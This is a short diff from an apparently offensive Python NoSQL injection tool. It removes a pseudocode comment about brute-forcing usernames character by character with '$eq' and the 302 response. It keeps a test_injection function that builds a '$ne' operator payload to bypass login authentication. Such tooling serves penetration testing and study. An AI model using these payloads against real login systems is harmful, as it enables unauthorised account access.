@@ -19,16 +19,6 @@ class bc:
     UNDERLINE = '\033[4m'
     DEFAULT = '\033[0m'
 
-'''
-POST
-for character a-zA-Z0-9:  # try all characters from a-z, A-Z
-    username[$eq]=a       # and 0-9 (dont forget special chars!)
-        if response != 302:
-            character += 1
-        else
-            save character and move to next
-'''
-
 def test_injection(h, r, up, pp, ij, ot):
     print(h,r,up,pp,ij,ot)
     payld = {up + '[$ne]' : 'a', pp + '[$ne]' : '1' + ',' + ot}
